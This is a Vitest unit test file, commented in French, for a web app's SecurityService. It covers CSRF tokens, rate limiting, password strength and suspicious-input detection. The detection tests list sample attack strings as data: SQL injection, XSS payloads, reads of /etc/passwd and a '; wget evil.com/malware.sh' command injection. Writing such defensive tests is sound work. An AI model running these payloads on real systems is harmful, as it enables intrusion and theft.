/**
 * Tests unitaires pour SecurityService.js
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { SecurityService } from '../src/services/SecurityService.js';

describe('SecurityService', () => {
  let service;

  beforeEach(() => {
    service = new SecurityService();
    // Clear any existing rate limits
    service.rateLimits.clear();
  });

  describe('generateCSRFToken', () => {
    it('should generate a CSRF token', () => {
      const token = service.generateCSRFToken();

      expect(token).toBeTruthy();
      expect(typeof token).toBe('string');
      expect(token.length).toBeGreaterThan(0);
    });

    it('should generate different tokens each time', () => {
      const token1 = service.generateCSRFToken();
      const token2 = service.generateCSRFToken();

      expect(token1).not.toBe(token2);
    });

    it('should store token in sessionStorage', () => {
      const token = service.generateCSRFToken();
      const stored = sessionStorage.getItem('csrf_token');

      expect(stored).toBe(token);
    });
  });

  describe('validateCSRFToken', () => {
    it('should validate correct token', () => {
      const token = service.generateCSRFToken();
      const isValid = service.validateCSRFToken(token);

      expect(isValid).toBe(true);
    });

    it('should reject invalid token', () => {
      service.generateCSRFToken();
      const isValid = service.validateCSRFToken('invalid-token');

      expect(isValid).toBe(false);
    });

    it('should reject null or undefined token', () => {
      service.generateCSRFToken();

      expect(service.validateCSRFToken(null)).toBe(false);
      expect(service.validateCSRFToken(undefined)).toBe(false);
    });
  });

  describe('generateRandomToken', () => {
    it('should generate token of specified length', () => {
      const token = service.generateRandomToken(16);

      expect(token).toBeTruthy();
      expect(token.length).toBe(32); // 16 bytes = 32 hex chars
    });

    it('should generate cryptographically random tokens', () => {
      const tokens = new Set();
      for (let i = 0; i < 100; i++) {
        tokens.add(service.generateRandomToken(16));
      }

      // All tokens should be unique
      expect(tokens.size).toBe(100);
    });
  });

  describe('checkRateLimit', () => {
    it('should allow first attempt', () => {
      const result = service.checkRateLimit('test-key', 5, 60000);

      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(4);
    });

    it('should track multiple attempts', () => {
      const key = 'test-key';

      const result1 = service.checkRateLimit(key, 5, 60000);
      expect(result1.allowed).toBe(true);
      expect(result1.remaining).toBe(4);

      const result2 = service.checkRateLimit(key, 5, 60000);
      expect(result2.allowed).toBe(true);
      expect(result2.remaining).toBe(3);

      const result3 = service.checkRateLimit(key, 5, 60000);
      expect(result3.allowed).toBe(true);
      expect(result3.remaining).toBe(2);
    });

    it('should block after max attempts', () => {
      const key = 'test-key';
      const maxAttempts = 3;

      // Make 3 attempts
      service.checkRateLimit(key, maxAttempts, 60000);
      service.checkRateLimit(key, maxAttempts, 60000);
      service.checkRateLimit(key, maxAttempts, 60000);

      // 4th attempt should be blocked
      const result = service.checkRateLimit(key, maxAttempts, 60000);

      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
      expect(result.retryAfter).toBeGreaterThan(0);
      expect(result.message).toContain('Trop de tentatives');
    });

    it('should reset after window expires', () => {
      const key = 'test-key';
      const windowMs = 100; // 100ms

      // Make max attempts
      service.checkRateLimit(key, 2, windowMs);
      service.checkRateLimit(key, 2, windowMs);

      // Should be blocked
      let result = service.checkRateLimit(key, 2, windowMs);
      expect(result.allowed).toBe(false);

      // Wait for window to expire
      return new Promise(resolve => {
        setTimeout(() => {
          // Should be allowed again
          result = service.checkRateLimit(key, 2, windowMs);
          expect(result.allowed).toBe(true);
          resolve();
        }, 150);
      });
    });

    it('should handle different keys independently', () => {
      const result1 = service.checkRateLimit('key1', 3, 60000);
      const result2 = service.checkRateLimit('key2', 3, 60000);

      expect(result1.allowed).toBe(true);
      expect(result2.allowed).toBe(true);
      expect(result1.remaining).toBe(2);
      expect(result2.remaining).toBe(2);
    });
  });

  describe('resetRateLimit', () => {
    it('should reset rate limit for key', () => {
      const key = 'test-key';

      // Make 3 attempts
      service.checkRateLimit(key, 3, 60000);
      service.checkRateLimit(key, 3, 60000);
      service.checkRateLimit(key, 3, 60000);

      // Should be blocked
      let result = service.checkRateLimit(key, 3, 60000);
      expect(result.allowed).toBe(false);

      // Reset
      service.resetRateLimit(key);

      // Should be allowed
      result = service.checkRateLimit(key, 3, 60000);
      expect(result.allowed).toBe(true);
    });
  });

  describe('checkPasswordStrength', () => {
    it('should rate weak password', () => {
      const result = service.checkPasswordStrength('password');

      expect(result.strength).toBe('weak');
      expect(result.score).toBeLessThan(3);
    });

    it('should rate medium password', () => {
      const result = service.checkPasswordStrength('Password123');

      expect(result.strength).toBe('medium');
      expect(result.score).toBeGreaterThanOrEqual(3);
    });

    it('should rate strong password', () => {
      const result = service.checkPasswordStrength('Password123!@#');

      expect(result.strength).toBe('strong');
      expect(result.score).toBe(5);
      expect(result.checks.length).toBe(true);
      expect(result.checks.uppercase).toBe(true);
      expect(result.checks.lowercase).toBe(true);
      expect(result.checks.number).toBe(true);
      expect(result.checks.special).toBe(true);
    });

    it('should check minimum length', () => {
      const weak = service.checkPasswordStrength('Pass1!');
      const strong = service.checkPasswordStrength('Pass1!AA');

      expect(weak.checks.length).toBe(false);
      expect(strong.checks.length).toBe(true);
    });
  });

  describe('detectSuspiciousActivity', () => {
    it('should detect SQL injection patterns', () => {
      expect(service.detectSuspiciousActivity("' OR 1=1 --")).toBe(true);
      expect(service.detectSuspiciousActivity("UNION SELECT * FROM users")).toBe(true);
      expect(service.detectSuspiciousActivity("DROP TABLE users")).toBe(true);
    });

    it('should detect XSS patterns', () => {
      expect(service.detectSuspiciousActivity("<script>alert('xss')</script>")).toBe(true);
      expect(service.detectSuspiciousActivity("javascript:void(0)")).toBe(true);
      expect(service.detectSuspiciousActivity("<img onerror='alert(1)' />")).toBe(true);
      expect(service.detectSuspiciousActivity("<iframe src='evil.com'></iframe>")).toBe(true);
    });

    it('should detect path traversal', () => {
      expect(service.detectSuspiciousActivity("../../etc/passwd")).toBe(true);
      expect(service.detectSuspiciousActivity("..\\..\\windows\\system32")).toBe(true);
    });

    it('should detect command injection', () => {
      expect(service.detectSuspiciousActivity("; ls -la")).toBe(true);
      expect(service.detectSuspiciousActivity("; cat /etc/passwd")).toBe(true);
      expect(service.detectSuspiciousActivity("; wget evil.com/malware.sh")).toBe(true);
    });

    it('should allow safe input', () => {
      expect(service.detectSuspiciousActivity("Hello, world!")).toBe(false);
      expect(service.detectSuspiciousActivity("Test mission for client ABC")).toBe(false);
      expect(service.detectSuspiciousActivity("Price: 500€")).toBe(false);
    });
  });

  describe('logSecurityEvent', () => {
    beforeEach(() => {
      localStorage.clear();
    });

    it('should log security event', () => {
      service.logSecurityEvent('test_event', { detail: 'test' });

      const logs = service.getSecurityLogs();
      expect(logs.length).toBe(1);
      expect(logs[0].event).toBe('test_event');
      expect(logs[0].detail).toBe('test');
      expect(logs[0].timestamp).toBeTruthy();
    });

    it('should limit to 100 events', () => {
      // Log 150 events
      for (let i = 0; i < 150; i++) {
        service.logSecurityEvent('event_' + i);
      }

      const logs = service.getSecurityLogs();
      expect(logs.length).toBe(100);
    });

    it('should clear security logs', () => {
      service.logSecurityEvent('test_event');
      expect(service.getSecurityLogs().length).toBe(1);

      service.clearSecurityLogs();
      expect(service.getSecurityLogs().length).toBe(0);
    });
  });
});
